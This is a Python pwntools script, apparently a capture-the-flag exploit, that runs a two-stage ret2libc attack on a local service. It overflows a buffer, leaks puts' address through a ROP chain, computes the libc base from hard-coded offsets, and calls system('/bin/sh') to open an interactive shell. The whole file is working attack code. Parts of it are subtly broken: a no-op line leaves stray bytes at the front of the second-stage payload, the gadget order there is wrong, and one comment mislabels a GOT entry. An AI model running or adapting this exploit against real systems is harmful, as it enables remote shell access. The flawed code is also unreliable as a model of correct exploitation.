#!/usr/bin/python
from pwn import *
#Module's GOT: 0x601000

p = remote("127.0.0.1", 4444)


data = p.recvuntil("dah?\n")
print data

# 4004e0:    ff 25 32 0b 20 00        jmpq   *0x200b32(%rip)        # 601018 <puts@GLIBC_2.2.5>

main = p64(0x400626) #main 
put = p64(0x4004e0) #puts@plt
got = p64(0x601018) #fgets@plt
pop = p64(0x4006d3) # pop rdi; ret
junk = "A"*72

payload = junk + pop + got + put + main

with open("pay","w") as f:
    f.write(payload)

p.sendline(payload)
data = p.recv()
data = data.split("\n")[0]
print data

# p.sendline(payload)
# data = p.recv()
# print data

leaked_puts = data[:8].strip().ljust(8, '\x00')
#leaked_puts = struct.unpack('Q', leaked_puts)[0]
log.success("leaked puts@GLIBLC: " + str(leaked_puts))
puts_addr = u64(leaked_puts[:8])
print "puts_addr ", hex(puts_addr)

## from https://libc.blukat.me/?q=puts%3A690&l=libc6_2.20-0ubuntu7_amd64
offset_puts = 0x06f699

# calculate the libc base
libc_base = puts_addr - offset_puts
print "libc_base", hex(libc_base)

# from libc-database
system_addr = libc_base + 0x045398
bin_sh_addr = libc_base + 0x18cd18

print "system address @", hex(system_addr)
print "/bin/sh @", hex(bin_sh_addr)
#2nd stage payload
payload + "A"*72
payload += p64(0x4004e0)
payload += p64(0x4006d3)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
p.sendline(payload)
p.interactive()
